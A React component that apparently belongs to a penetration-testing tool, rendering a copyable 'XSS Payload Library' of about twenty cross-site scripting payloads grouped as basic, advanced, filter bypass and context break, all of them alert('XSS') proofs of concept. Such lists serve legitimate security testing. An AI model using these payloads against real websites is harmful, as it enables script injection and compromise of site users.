import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { FiCopy } from 'react-icons/fi';
import { useTheme } from '../contexts/ThemeContext';

const payloadData = {
  basic: [
    { payload: `<script>alert('XSS')</script>`, description: 'Basic script execution.' },
    { payload: `<img src=x onerror=alert('XSS')>`, description: 'Image error handler.' },
    { payload: `<svg onload=alert('XSS')>`, description: 'SVG onload event.' },
    { payload: `<iframe src="data:text/html,<script>alert('XSS')</script>">`, description: 'Iframe with data URI.' },
    { payload: `<body onload=alert('XSS')>`, description: 'Body onload event.' },
  ],
  advanced: [
    { payload: `<details/open/ontoggle=alert('XSS')>`, description: 'Details tag toggle event.' },
    { payload: `<marquee onstart=alert('XSS')>`, description: 'Marquee onstart event.' },
    { payload: `<input autofocus onfocus=alert('XSS')>`, description: 'Input autofocus with onfocus.' },
    { payload: `<select onfocus=alert('XSS') autofocus>`, description: 'Select autofocus with onfocus.' },
    { payload: `<textarea onfocus=alert('XSS') autofocus>`, description: 'Textarea autofocus with onfocus.' },
  ],
  bypass: [
    { payload: `<ScRiPt>alert('XSS')</ScRiPt>`, description: 'Case variation bypass.' },
    { payload: `<img src="x" onerror="alert('XSS')">`, description: 'Double quotes variant.' },
    { payload: `<img src='x' onerror='alert("XSS")'>`, description: 'Single quotes variant.' },
    { payload: `<img src=x onerror=alert(String.fromCharCode(88,83,83))>`, description: 'Character encoding bypass.' },
    { payload: `<svg><script>alert('XSS')</script></svg>`, description: 'SVG with script tag.' },
    { payload: `<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>`, description: 'Base64 encoded payload.' },
  ],
  context: [
    { payload: `"onmouseover="alert('XSS')`, description: 'Breaking out of attribute context.' },
    { payload: `';alert('XSS');//`, description: 'Breaking out of JavaScript context.' },
    { payload: `</script><script>alert('XSS')</script>`, description: 'Breaking out of script context.' },
    { payload: `</title><script>alert('XSS')</script>`, description: 'Breaking out of title context.' },
    { payload: `data:text/html,<script>alert('XSS')</script>`, description: 'Data URI protocol for href/src.' },
  ],
};

const XssPayloadLibrary = () => {
  const [activeCategory, setActiveCategory] = useState('basic');
  const [copied, setCopied] = useState(null);
  const { isDarkMode } = useTheme();

  const handleCopy = (payload) => {
    navigator.clipboard.writeText(payload);
    setCopied(payload);
    setTimeout(() => setCopied(null), 2000);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className={`mt-6 p-6 rounded-lg shadow-lg ${
        isDarkMode 
          ? 'bg-gray-800 bg-opacity-50 border border-gray-700' 
          : 'bg-white bg-opacity-80 border border-gray-200'
      }`}
    >
      <h3 className="text-xl font-bold mb-4">XSS Payload Library</h3>
      <div className="flex space-x-2 mb-4 border-b border-gray-700 overflow-x-auto">
        <button onClick={() => setActiveCategory('basic')} className={`px-4 py-2 text-sm font-medium transition-colors whitespace-nowrap ${activeCategory === 'basic' ? 'border-b-2 border-green-500 text-white' : 'text-gray-400 hover:text-white'}`}>Basic</button>
        <button onClick={() => setActiveCategory('advanced')} className={`px-4 py-2 text-sm font-medium transition-colors whitespace-nowrap ${activeCategory === 'advanced' ? 'border-b-2 border-green-500 text-white' : 'text-gray-400 hover:text-white'}`}>Advanced</button>
        <button onClick={() => setActiveCategory('bypass')} className={`px-4 py-2 text-sm font-medium transition-colors whitespace-nowrap ${activeCategory === 'bypass' ? 'border-b-2 border-green-500 text-white' : 'text-gray-400 hover:text-white'}`}>Filter Bypass</button>
        <button onClick={() => setActiveCategory('context')} className={`px-4 py-2 text-sm font-medium transition-colors whitespace-nowrap ${activeCategory === 'context' ? 'border-b-2 border-green-500 text-white' : 'text-gray-400 hover:text-white'}`}>Context Break</button>
      </div>
      <div>
        {payloadData[activeCategory].map((item, index) => (
          <div key={index} className="p-2 border-b border-gray-700/50">
            <div className="flex justify-between items-center">
              <code className={`text-sm ${isDarkMode ? 'text-gray-300' : 'text-gray-800'}`}>{item.payload}</code>
              <button onClick={() => handleCopy(item.payload)} className="text-gray-400 hover:text-white">
                <FiCopy />
              </button>
            </div>
            <p className="text-xs text-gray-500 mt-1">{item.description}</p>
            {copied === item.payload && <p className="text-xs text-green-500 mt-1">Copied!</p>}
          </div>
        ))}
      </div>
    </motion.div>
  );
};

export default XssPayloadLibrary;

